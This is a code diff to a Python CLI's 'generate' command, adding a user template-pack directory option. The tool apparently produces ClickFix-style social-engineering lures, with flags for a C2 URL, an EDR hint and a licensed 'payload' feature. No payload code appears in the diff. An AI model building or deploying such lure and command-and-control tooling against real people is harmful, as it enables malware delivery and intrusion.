@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 from .cli_core import _num, emit_json, err, ok, text
+from .util import c_dim
 
 
 class GenerateCommands:
@@ -10,17 +11,33 @@ class GenerateCommands:
     dispatch helpers (_need/_feature) live there."""
 
     def cmd_generate(self) -> None:
-        from .generator import generate, list_packs, write_bundle
+        from .generator import (
+            generate,
+            list_packs,
+            set_pack_dir,
+            write_bundle,
+        )
 
         usage = (
             "generate <pack>|list [--channel C] [--variants N] [--seed N] "
             "[--url U] [--continue U] [--locale fr|en] [--out DIR] "
-            "[--edr-hint H] [--c2 URL]"
+            "[--edr-hint H] [--c2 URL] [--pack-dir D]"
         )
         self._need(2, usage)
+        # user template packs: --pack-dir wins over ~/.clickfix/packs
+        set_pack_dir(str(self.flags.get("pack-dir") or "") or None)
         if self.pos[1] == "list":
+            from .generator import USER_PACK_DIR
+
             for pack_id in list_packs():
                 text(pack_id)
+            text("")
+            text(
+                c_dim(
+                    f"  builtin + {USER_PACK_DIR} (+ --pack-dir). "
+                    "drop a validated pack JSON there and regenerate."
+                )
+            )
             return
 
         has_chain = self.lic.has("payload")
